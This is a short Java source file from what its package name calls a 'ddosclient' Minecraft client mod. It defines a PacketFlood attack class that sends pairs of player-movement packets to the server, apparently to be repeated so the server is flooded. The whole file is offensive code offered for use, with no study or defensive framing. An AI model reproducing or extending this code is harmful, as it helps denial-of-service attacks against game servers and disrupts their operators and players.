package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class PacketFlood extends BaseAttack {
    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null || mc.player == null) return;
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(false));
    }
}
